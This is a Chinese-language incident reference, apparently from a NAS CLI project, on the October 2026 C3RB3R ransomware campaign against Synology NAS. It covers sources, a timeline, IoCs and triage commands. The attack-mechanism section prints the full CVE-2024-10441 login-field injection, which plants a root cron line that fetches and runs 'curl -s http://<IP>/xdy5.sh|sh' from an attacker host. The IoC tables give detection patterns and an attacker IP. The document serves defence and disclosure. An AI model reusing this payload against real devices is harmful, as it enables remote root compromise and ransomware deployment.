# 针对 Synology NAS 的 C3RB3R / `.L0CK3D` 勒索软件攻击

[English](INCIDENT-C3RB3R.md) · [繁體中文](INCIDENT-C3RB3R.zh-TW.md) · [简体中文](INCIDENT-C3RB3R.zh-CN.md)

针对 2026 年 10 月面向公网暴露的 Synology NAS 设备勒索软件攻击活动的公开事件参考、入侵指标（IoC）、CLI 排查验证步骤与恢复指南。

## 摘要

- 2026 年 10 月，一波勒索软件攻击加密了暴露在公网上的 Synology NAS 设备，将受损文件追加 `.L0CK3D` 扩展名（中间为数字 0），并在每个目录中投放名为 `read-me3.txt` 的勒索信 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- 写入各级文件夹与根目录的 `read-me3.txt` 勒索信中包含 `C3RB3R INSTRUCTIONS` 字样 ([HKEPC on Threads, 2026-10-29](https://www.threads.com/@hkepc/post/DfFNi9Xibnj))；itnotetk 指出 `C3RB3R INSTRUCTIONS` 是勒索信标题，并报告每封勒索信内均含有一组本地生成的 6 位数设备 ID ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- 根据奇虎 360 对样本 MD5 `a1375e0f82ae86df528876c049b5a23c` 的分析，加密器对每个文件使用独立的 256 位 ChaCha8 密钥与 64 位 nonce，并用 RSA-2048 封装后追加在文件末尾；对 187 种高优先级文件扩展名执行全量加密，对其他文件执行部分加密，并跳过 27 个系统目录 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[社区报告]** 受害者反映每个被加密的文件体积增加 588 字节，大型非高优先级文件（例如 21 MB 的 PDF）会有三段各约 4% 的区段被加密，且来自 Kaspersky（`RakhniDecryptor`）、Emsisoft 与 Dr.Web（`Trojan.Encoder.38200`）的现有解密工具均无法解密这些文件 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- 恶意软件家族渊源在研究人员之间存在分歧：奇虎 360 将 C3RB3R 归类为 Cerber 家族的变种 ([360, 2026-10-29](https://www.360.cn/n/13055.html))，而 BleepingComputer 论坛的研究人员自 2022 年起便将 C3RB3R 追踪为基于泄露的 Conti v3 源代码构建的分支 ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[社区报告]** 未经证实的报告称，攻击者的支付门户提供一次免费解密单个不超过 1024 KB 文件的机会，并索要 0.037 至 0.085 BTC 的赎金（五天后翻倍），同时声称已窃取数据，但该说法尚无证据支持且未见已知的数据泄露站点 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 已知事实（附消息来源）

### Synology 官方声明与 Synology-SA-24:20

- **[一手来源]** 2026-10-29，Synology 发布安全声明，表示“发现威胁行为者在运行过时 DSM 版本的设备上利用了一个早在 2024 年 12 月即已修补的漏洞”来加密数据并勒索赎金，声明直接链接至安全公告 Synology-SA-24:20，并敦促用户立即更新 DSM 及启用自动更新 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[一手来源]** Synology 于 2026-10-29 发布的新闻稿未点明具体的 CVE 编号、修复版本号或受害设备数量，也未提及 `C3RB3R`、`.L0CK3D`、`read-me3.txt`、QuickConnect、端口、密码或快照等字样 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[一手来源]** Synology-SA-24:20（2024-11-05 发布，2024-12-05 补充 DSM 6.2 修复版本，2025-03-19 披露技术细节，2025-03-28 最后更新）涵盖 CVE-2024-10441（CVSS 3.1 评分 9.8 Critical，系统插件守护进程中的输出编码不当漏洞，可导致远程任意代码执行，曾在 Pwn2Own 2024 上演示）、CVE-2024-50629（CVSS 5.3）以及 CVE-2024-10445（CVSS 4.3），修复版本为 DSM 7.2.2-72806-1、7.2.1-69057-6、7.2-64570-4、7.1.1-42962-7 与 6.2.4-25556-8 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。

### 奇虎 360 的分析与 Synology-SA-26:13

- **[360 调查结论的一手来源]** 奇虎 360 反勒索团队报告称自 2026 年 10 月起接到多起 Synology NAS 勒索软件求助案例，将攻击归因于 C3RB3R，并指出攻击者将 CVE-2026-13639 与 CVE-2026-13684（已于 Synology-SA-26:13 修补）作为 1-day 漏洞加以利用以实现初始入侵 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[一手来源]** Synology-SA-26:13（2026-09-18 发布，严重级别 Critical，状态 Resolved，缓解措施“None”）共修复了 8 个 DSM 漏洞：CVE-2026-13684（SCGI，CWE-116，CVSS 9.8，未授权任意文件读写与拒绝服务）、CVE-2026-13639（登录逻辑，CWE-331 熵不足，CVSS 9.8，未授权任意文件读写与拒绝服务）、CVE-2026-13673（LDAP API，CVSS 8.8，需身份验证）、CVE-2026-6205（Upload API，CVSS 8.1，需身份验证）、CVE-2026-13635（Auth API，CVSS 5.3）、CVE-2026-13623（Theme API XSS，CVSS 4.8，需管理员权限）、CVE-2026-13666（Sharing API CRLF，CVSS 3.5）以及 CVE-2026-13683（EventScheduler API SQL 注入，CVSS 2.7，需管理员权限）([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13))。
- **[一手来源]** 新加坡网络安全局（CSA）发布的警报 AL-2026-127 重点指出了 SA-26:13 中影响 DSM 7.4、7.3 与 7.2 的四个最高危 CVE 漏洞（评分分别为 9.8、9.8、8.8、8.1），并建议管理员立即安装补丁 ([CSA Singapore AL-2026-127, 2026-09-23](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/))。

| DSM 分支 | SA-26:13 修复版本 | SA-24:20 修复版本 |
|---|---|---|
| DSM 7.4 | `7.4-90075` 及更高版本 | 已包含在基线版本中 |
| DSM 7.3.2 | `7.3.2-86009 Update 4` (`7.3.2-86009-4`) | 已包含在基线版本中 |
| DSM 7.2.2 | `7.2.2-72806 Update 9` (`7.2.2-72806-9`) | `7.2.2-72806-1` |
| DSM 7.2.1 | `7.2.1-69057 Update 12` (`7.2.1-69057-12`) | `7.2.1-69057-6` |
| DSM 7.2 | 未列入 SA-26:13（需升级至已修复的分支） | `7.2-64570-4` |
| DSM 7.1 及更早版本 | 未列入 SA-26:13（需升级至已修复的分支） | `7.1.1-42962-7` / `6.2.4-25556-8` |

### Synology-SA-26:14（“PHP2Shell”）

- **[一手来源]** Synology-SA-26:14（2026-10-22 发布，2026-10-26 更新，严重级别 Critical，状态 Resolved）修复了 CVE-2026-109618 与 CVE-2026-109619（Synology 公告中 CVSS 3.1 评分为 9.8；NVD 与 CyberQ 中 CVSS v4.0 评分为 9.2），这两个漏洞属于 PHP 核心内存损坏与残留内部请求状态缺陷，可导致远程代码执行 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[一手来源]** SA-26:14 下的已修复套件版本包括：Synology Calendar `3.0.4-21435`、MailStation `30000002.3.19-20333`、PHP 7.4 `7.4.33-0131`、PHP 8.0 `8.0.30-0122`、PHP 8.1 `8.1.34-0120`、PHP 8.2 `8.2.35-0171`、PHP 8.3 `8.3.36-0051` 以及 PHP 8.4 `8.4.27-0051`；PHP 7.3 已终止支持（EOL）且无修复补丁，而 Hyper Backup（于 2026-10-26 的第 2 版修订中加入）被列为不受影响 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14))。
- **[一手来源]** Synology 关于 PHP2Shell 的声明列出了十个依赖 PHP 套件的受影响套件（Calendar、IDrive、Joomla、KodExplorer、MailStation、MediaWiki、phpMyAdmin、vtigerCRM、Web Station、WordPress），指出 MailStation 必须手动更新，说明 IDrive 为第三方套件且 Synology Drive 不受 PHP2Shell 影响，将 PHP 安全更新扩展至已终止支持的 DSM 7.2/7.1/7.0 与 6.2，并声明 DSM 内置的 PHP 组件不包含任何可从外部访问的模块（Synology PSIRT 评估其风险极低，并计划在后续 DSM 版本中修复）([Synology PHP2Shell statement, 2026-10-22 / 2026-10-28](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions))。
- **[一手来源]** CISA 于 2026-10-26 将 CVE-2026-109618 与 CVE-2026-109619 列入其已知被利用漏洞（KEV）目录，针对的是通用 PHP 漏洞利用，而非特定于 Synology 的攻击 ([CISA KEV alert, 2026-10-26](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog))。
- **[社区报告]** 用户反映，当 Hyper Backup 依赖 PHP 7.4 时，在 Package Center（套件中心）中卸载 PHP 7.4 会提示一并移除 Hyper Backup；直接停用或更新 PHP 7.4 则可避免移除 Hyper Backup ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。

### 各方对入侵途径的归因分歧

- **Synology（SA-24:20）：** Synology 于 2026-10-29 发布的官方声明将针对旧版 DSM 的勒索软件攻击关联至 Synology-SA-24:20（2024 年 12 月已修补，涵盖 CVE-2024-10441）([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[社区报告] 与 CVE-2024-10441 吻合的取证日志：** Reddit 用户 `u/NakamuraHwang`（使用 DS918+）检查了日志与系统文件，将入侵途径追溯至 CVE-2024-10441 ([LavX News relay of Tom's Hardware, 2026-10-29](https://news.lavx.hu/article/ransomware-hits-internet-exposed-synology-nas-via-18-month-old-remote-code-flaw), [Mallory summary](https://mallory.ai/stories/01a187e2-d9c9-7ab1-b0ef-d1b444d9a0f3))；洞云实验室（Dongyun Lab）转述了捕获到的攻击流量：发往公网暴露的 DSM 登录页面的请求中，用户名字段携带了 `PLUGIN_VALUE_END`、`LD_PRELOAD` 与 `LD_DEBUG_OUTPUT`，两分钟后 root 便执行了 `/etc/cron.d/synot*` ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。2026-10-28 的在野观测证实：该请求为 `SYNO.API.Auth` v7 `login`，且攻击载荷出现在 `/var/log/synoplugin.log*` 中（见[下文](#在野观测记录-2026-10-28)）。
- **奇虎 360（SA-26:13）：** 奇虎 360 的分析将 2026 年 10 月 Synology NAS C3RB3R 入侵事件归因于针对 Synology-SA-26:13 中 CVE-2026-13639 与 CVE-2026-13684 的 1-day 漏洞利用 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[媒体报道] 未经证实的 PHP2Shell（SA-26:14）与容器入侵说法：** Guru3d 转述 HKEPC 的报道，列出了传闻中的入侵途径：NAS 上运行并映射至公网的 Web 服务 Docker 容器（例如 GitLab，引用了 GitLab CVE-2026-110264 与 CVE-2026-97229），以及 Synology 套件漏洞（引用了 SA-26:14，即 PHP 核心远程代码执行漏洞 PHP2Shell）；该报道并未表示 Synology 官方将 SA-26:14 与此次攻击活动关联，而 Synology 自身的声明指向的是 SA-24:20，且 CyberQ 与 XFastest HK 均指出目前尚无确凿证据表明 PHP2Shell 与 `.L0CK3D` 勒索软件案例有关 ([Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/), [HeaTalk, 2026-10-30](https://www.heatalk.com/20261030/17076/), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/))。
- **[社区报告] 关于较新 DSM 版本的二手报告：** 二手媒体转述提到有受害者自称运行 DSM `7.2.1-69057 Update 9`，以及一起 Solar 应急响应案例声称受害设备运行的是 DSM `7.4.1-90080 Update 1`（版本高于 SA-26:13 修复版本），应急响应人员在该案例中并未排除存在未修补漏洞的可能性 ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/), [Appinn, 2026-10-29](https://www.appinn.com/synology-nas-ransomware-2026))。

### 历史背景：针对 Synology NAS 的早期攻击活动

- **SynoLocker (2014) [一手来源]：** 利用了 DSM 4.3-3810 及更早版本中的两个已于 2013 年底修复的 DSM 漏洞；当时受影响设备在 DSM Update 中会误报“没有可用的更新” ([Synology SynoLocker advisory, 2014-08-07](https://www.synology.com/en-uk/security/advisory/SynoLocker))。
- **2019 年 7 月暴力破解潮与 eCh0raix / QNAPCrypt [一手来源 / 媒体报道]：** 攻击者利用僵尸网络对暴露在公网上的 DSM 管理员账户发起凭据填充（撞库）与字典攻击，进而部署 eCh0raix 勒索软件 ([Synology 2019 ransomware release, 2019-07-23](https://www.synology.com/en-uk/company/news/article/2019JulyRansomware), [Security Affairs, 2021-08](https://securityaffairs.com/120994/cyber-crime/ech0raix-ransomware-qnap-synology.html), [Unit 42, 2021-08-10](https://unit42.paloaltonetworks.com/ech0raix-ransomware-soho/))。
- **StealthWorker 僵尸网络 (2021) [一手来源]：** Synology PSIRT 追踪了针对公网暴露 NAS 设备上弱管理员凭据的持续性僵尸网络暴力破解攻击 ([Synology BruteForce release, 2021-08-04](https://www.synology.com/en-global/company/news/article/BruteForce))。
- **DeadBolt (2022) [一手来源]：** 针对面向公网的 QNAP 与 ASUSTOR NAS 设备发起攻击（无已确认的 Synology 受害者），再次印证了切勿将 NAS 管理界面暴露在公共互联网上的安全准则 ([Trend Micro, 2022-06-06](https://www.trendmicro.com/en_gb/research/22/f/closing-the-door-deadbolt-ransomware-locks-out-vendors-with-mult.html))。
- **RISK:STATION (2024) [一手来源]：** Midnight Blue 披露了 Synology Photos 中的 CVE-2024-10443 漏洞，并证明 QuickConnect 的 TLS 证书会记录在公开的证书透明度（Certificate Transparency）日志中，使得数以百万计的 `*.quickconnect.to` 子域名可被枚举，且即便路由器未配置端口转发，攻击者也能通过 QuickConnect 中继访问设备 ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation))。

## 时间线

- **2024-11-05 / 2024-12-05：** Synology 发布 Synology-SA-24:20，修复 DSM 7.1/7.2 中的 CVE-2024-10441，并于 2024 年 12 月补充 DSM 6.2 的修复补丁 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。
- **2026-09-18：** Synology 发布 Synology-SA-26:13，修复 CVE-2026-13684、CVE-2026-13639 及另外六个 DSM 漏洞 ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13))。
- **2026-09-23：** 新加坡网络安全局（CSA）发布警报 AL-2026-127，敦促立即安装 Synology-SA-26:13 补丁 ([CSA Singapore AL-2026-127](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/))。
- **2026 年 10 月初：** 奇虎 360 开始收到 Synology NAS 设备遭 C3RB3R / `.L0CK3D` 加密的报告 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **2026-10-17 起：** **[社区报告]** NAS 受害者（包括 Synology 及一台 Zyxel NAS326 用户）开始在 BleepingComputer 的 C3RB3R 求助帖中发帖 ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **2026-10-22：** Synology 发布 Synology-SA-26:14（“PHP2Shell”，即 CVE-2026-109618 与 CVE-2026-109619），并将 PHP 套件更新扩展至已终止支持的 DSM 分支 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [Synology PHP2Shell statement](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions))。
- **2026-10-26：** Synology 更新 SA-26:14 说明 Hyper Backup 不受影响，同日 CISA 将 CVE-2026-109618 与 CVE-2026-109619 列入 KEV 目录 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CISA KEV alert](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog))。
- **2026-10-28：** **[社区报告]** 12 小时内在 `r/synology` 上出现至少四篇求助帖（[itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)，例如这篇 [r/synology post](https://www.reddit.com/r/synology/comments/1xhyt6w/hit_with_c3rb3r_ransomware_this_am/)），同时 `u/NakamuraHwang` 发布了现场取证报告，展示出登录注入字段（`PLUGIN_VALUE_END`、`LD_PRELOAD`、`LD_DEBUG_OUTPUT`）以及 root 计划任务 `/etc/cron.d/synot*` ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。
- **2026-10-29：** Synology 发布官方声明将攻击关联至 SA-24:20，奇虎 360 同日发布针对 C3RB3R 的技术分析报告 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions), [360, 2026-10-29](https://www.360.cn/n/13055.html), [HKEPC on Threads](https://www.threads.com/@hkepc/post/DfFNi9Xibnj))。
- **2026-10-30：** CyberQ、XFastest HK 与 itnotetk 发表综合分析文章，对比了 Synology 的 SA-24:20 声明、360 的 SA-26:13 归因以及受害者报告 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 攻击原理

### NAS 是如何暴露在公网上的

- **[社区报告]** 在 CyberQ 收集的受害者案例中，DSM 登录页面均可通过路由器 UPnP 自动端口映射、为 Plex 或流媒体开启的端口转发、QuickConnect 或反向代理（一台 NAS 位于 nginx 后端；另一台通过路由器转发了 SMB）从公网访问；每一起已知细节的案例都存在端口转发或直接暴露的管理界面，CyberQ 的防护建议特别点明了端口 5000/5001（DSM）与 445（SMB）([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[一手来源]** QuickConnect 证书会记录在公开的证书透明度（Certificate Transparency）日志中，使攻击者能够枚举 `*.quickconnect.to` 子域名，即便路由器未转发任何端口，也能通过 QuickConnect 中继访问 DSM ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation))。
- **[一手来源]** 当 NAS 自身通过 PPPoE 拨号、处于路由器 DMZ 中，或持有全球单播 IPv6 地址且路由器与 DSM 防火墙均未配置入站丢弃规则时，其上监听的每一项服务都会直接暴露在公网上 ([Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7))。
- **[社区报告]** CyberQ 转述 pwn.watch 引用的 360 反勒索团队分析，描述了 CVE-2026-13639（DSM 登录逻辑中的熵不足漏洞）与 CVE-2026-13684（DSM SCGI 组件中的输出编码不当漏洞）：攻击者的登录请求本身虽未成功登录，却能以系统权限读写文件，因此强密码与双重验证（2FA）均无法阻挡攻击；多名受害者表示当时双重验证、强密码、停用默认 `admin` 账户以及 AutoBlock 均处于开启状态 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[社区报告]** 运行 DSM `7.1.1-42962 Update 9` 等旧分支的设备在 Control Panel（控制面板）中会显示“您的 DSM 版本已是最新”，因为 DSM 自动更新不会自动跨越主/次版本分支，必须手动升级 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[社区报告]** 长期挂载在 NAS 上的 USB 备份硬盘以及未开启版本隔离的本地 Hyper Backup 备份目标会随共享文件夹一同被加密；在其中一个案例（`u/avebelle`）中，36 个快照里有 35 个被删除，而其他受害者则发现自己的 Btrfs 快照完好无损并借此成功恢复了数据 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))；洞云实验室指出，加密脚本仅遍历普通文件夹，并未执行任何删除 Btrfs 快照的命令 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。

### 在野观测记录 (2026-10-28)

**[社区报告]** 在野观测记录（2026-10-28）：攻击者通过 DSM 登录接口利用了 CVE-2024-10441（Synology-SA-24:20，系统插件守护进程中的输出编码缺陷）([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。该请求调用 `SYNO.API.Auth` v7 `login`，其账户字段内容如下（其中的换行符与制表符均为真实字符）：

```
admin
PLUGIN_VALUE_END
LD_PRELOAD=PLUGIN_VALUE_START
NOP
*	*	*	*	*	root	echo	<base64 of "curl -s http://<IP>/xdy5.sh|sh">	|base64	-d|sh
NOP
PLUGIN_VALUE_END
LD_DEBUG=libs
LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>
ESCAPE=PLUGIN_VALUE_START
NOP
```

在野观测记录（2026-10-28）：该字段为插件进程设置了环境变量 `LD_DEBUG=libs` 与 `LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>`，导致 glibc 动态链接器的调试输出（其中会原样回显账户字段及内含的 cron 计划任务行）直接写入 `/etc/cron.d/`。该行的计划时间字段为 `* * * * *`：cron 每分钟都会以 root 权限执行一次，解码后即运行 `curl -s http://<IP>/xdy5.sh|sh`。洞云实验室描述了相同的结果：在核验账户之前，glibc 动态加载器便已以 root 身份向 `/etc/cron.d/` 写入了一行计划任务 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。CVE-2024-10441 已在 SA-24:20 的各修复版本中修补 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。

- **[社区报告]** 在洞云实验室转述的取证记录中，注入的登录请求（NAS 时间约 13:45）由系统插件守护进程 `synotade` 处理，两分钟后（13:47）root 执行了 `/etc/cron.d/synot*`，从 `http://46.8.78.122/xdy5.sh` 拉取脚本。该脚本将核心加密器保存为 `/bin/qnetd` 并启动，下载 `/bin/libgld` 作为备用载荷，同时创建 `/bin/l0ck.enc` 作为互斥标记以确保仅运行单个加密进程（加密完成后删除）；`rm.log` 记录了对临时文件 `synotade.<PID>` 的清理操作。部分受害者在文件被加密前收到了 Log Center（日志中心）发出的 `.SYNOACCOUNTDB` 数据库损坏邮件通知，另有 V2EX 受害者记录到加密开始前 8 分钟曾有来自 `46.8.78.122` 的失败登录 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。一名受害者观察到名为 `libgld` 的加密进程，还有一起案例中 DSM 被重置为初始状态并多出了一个 `admin2` 主目录 ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 入侵指标（IoC）以及 `nas incident --deep` 的检查方式

| 指标（Indicator） | 位置 | 检查项 | 来源 |
|---|---|---|---|
| 登录请求中包含 `PLUGIN_VALUE_END`、`LD_PRELOAD=`、`LD_DEBUG_OUTPUT` | DSM 连接日志（`SYNO.Core.SyslogClient.Log`，约最近 10,000 条记录） | `exploit_attempts`（普通会话） | 在野观测记录（2026-10-28）；相关字符串亦见于 [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128) |
| 相同字符串，包含攻击载荷的 `POST weblogin Args: USER=...` | `/var/log/synoplugin.log*`（仅限 root，轮转压缩为 `.xz`） | `exploit_attempts_logs`（`--deep`） | 在野观测记录（2026-10-28） |
| 包含攻击载荷的“failed to sign in”事件文本 | `/var/log/synoscgi.log*`（仅限 root，`.xz`） | `exploit_attempts_logs` | 在野观测记录（2026-10-28） |
| 不含 `user=` 字段的 `authentication failure ... rhost=<IP>` | `/var/log/auth.log*`（仅限 root） | `exploit_attempts_logs` | 在野观测记录（2026-10-28） |
| 源地址 `46.8.78.122`、`104.253.175.125`（`incident.ioc_ips`，可扩展） | 上述所有日志及网络连接 | `exploit_attempts`, `exploit_attempts_logs`, `ioc_processes` | `46.8.78.122`：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)；`104.253.175.125`：在野观测记录（2026-10-28） |
| `/etc/cron.d/synot*`，以及含 `base64 -d`、`\| sh`、`curl`/`wget`、`xdy5` 的 cron 行 | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron` | `ioc_cron` | `/etc/cron.d/synot*`、`xdy5.sh`：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)；`echo <base64> \| base64 -d \| sh` 行：在野观测记录（2026-10-28） |
| `/bin/libgld`、`/bin/qnetd`、`/bin/l0ck.enc` 及任何 `xdy5*` 文件 | `/bin`、`/usr/bin`、临时文件夹、`/etc`、`/root`、`/var/spool`（3 层目录） | `ioc_binaries` | [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128) |
| 第二个 uid 0 账户；uid >= 1024 的未知账户 | `/etc/passwd`（排除套件账户与 `incident.allowed_users`） | `ioc_users` | `admin2` 主目录：[itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)；uid 检查为通用持久化排查项 |
| root 或任何主目录下的 `authorized_keys` | `/root/.ssh`, `/var/services/homes/*/.ssh`, `/volume*/homes/*/.ssh` | `ioc_ssh_keys` | 通用持久化排查项 |
| 名为 `libgld`/`qnetd`/`xdy5*` 或从 `/tmp`、`/var/tmp`、`/dev/shm` 运行的进程；位于 Synology 路径之外的可执行文件；连往公网地址（报告提示）或连往 IOC 地址（判定为 FAIL）的已建立 TCP 连接 | `/proc` | `ioc_processes` | 进程名：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)、[itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)；其余为通用排查项 |
| 匹配 `*.L0CK3D`、`*.LOCK3D` 或 `read-me3.txt` 的文件 | 通过 File Station 搜索所有可见共享文件夹 | `ransomware_files`（`--scan`） | `*.L0CK3D`、`read-me3.txt`：[360, 2026-10-29](https://www.360.cn/n/13055.html)；`*.LOCK3D`（字母 O）：[BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4) |

判定结果说明：命中已知恶意特征 = `FAIL`；未知条目（Synology 路径之外的 cron 行、未列入允许名单的账户、Synology 路径之外的可执行文件、标记为 `(deleted)` 的可执行文件、任何 `authorized_keys`）= `WARN`；日志中发现利用尝试 = `WARN` 并提示“attempt seen”。容器进程仅统计数量，不做风险判定。日志文本作为纯数据展示：控制字符已转义，过长的内容会截断；使用 `--json` 时会在 `deep` 字段下附加收集器的原始输出结果。

`--deep` 的运行机制：

- `--backend password`：在 Task Scheduler（任务计划）中创建一个临时 root 任务（先执行 `SYNO.Core.User.PasswordConfirm`，再调用 `SYNO.Core.TaskScheduler.Root create`、以 `run` v2 运行，完毕后立即删除），执行一段 Python 脚本（任务脚本内经 zlib + base64 编码）([DSM-API-NOTES.md](DSM-API-NOTES.md))。若检测到 `deploy.stage_dir` 是符号链接则立即中止；否则以 `O_CREAT|O_EXCL|O_NOFOLLOW` 标志写入单个文件 `<stage_dir>/nas-deep-<random>.json` 并附带随机标记，随后 CLI 通过 File Station 读取该文件、校验标记并将其删除 ([DSM-API-NOTES.md](DSM-API-NOTES.md))。使用前必须配置 `deploy.stage_dir`（指向当前账户可写的共享文件夹内的子目录；若不存在会自动创建）。
- `--backend local`（在 NAS 本机以 root 身份运行）：直接执行同一脚本并输出 JSON ([DSM-API-NOTES.md](DSM-API-NOTES.md))。
- 除上述临时结果文件外不写入任何其他内容；脚本仅执行只读操作 ([DSM-API-NOTES.md](DSM-API-NOTES.md))。

手动等效排查命令（以 root 身份执行）：`xzcat -f /var/log/synoplugin.log* /var/log/synoscgi.log* /var/log/auth.log* | grep -E 'PLUGIN_VALUE_END|LD_DEBUG_OUTPUT|46\.8\.78\.122|104\.253\.175\.125'`、`ls -la /etc/cron.d /bin/libgld /bin/qnetd /bin/l0ck.enc`、`awk -F: '$3>=1024 || ($3==0 && $1!="root")' /etc/passwd`、`ls -la /root/.ssh /var/services/homes/*/.ssh`、`ls -l /proc/*/exe`、`cat /proc/net/tcp`。

## 使用 CLI 判断“我是否受影响？”的排查步骤

1. **运行包含端口探测与勒索信搜索的只读安全审计：**
   ```bash
   nas incident --probe --scan --json
   ```
2. **运行深度 root 收集器，检查仅限 root 读取的日志、crontab、二进制文件、用户、SSH 密钥与 `/proc`：**
   ```bash
   nas incident --deep --json
   ```
3. **解读输出结果：**
   - **`ransomware_files: FAIL` 或任一 `ioc_*`（`ioc_cron`、`ioc_binaries`、`ioc_users`、`ioc_processes`）为 `FAIL`：** NAS 存在正在发生或已完成的 C3RB3R 入侵指标；请立即跳转至下方的[恢复步骤](#恢复步骤)进行处置 ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide))。
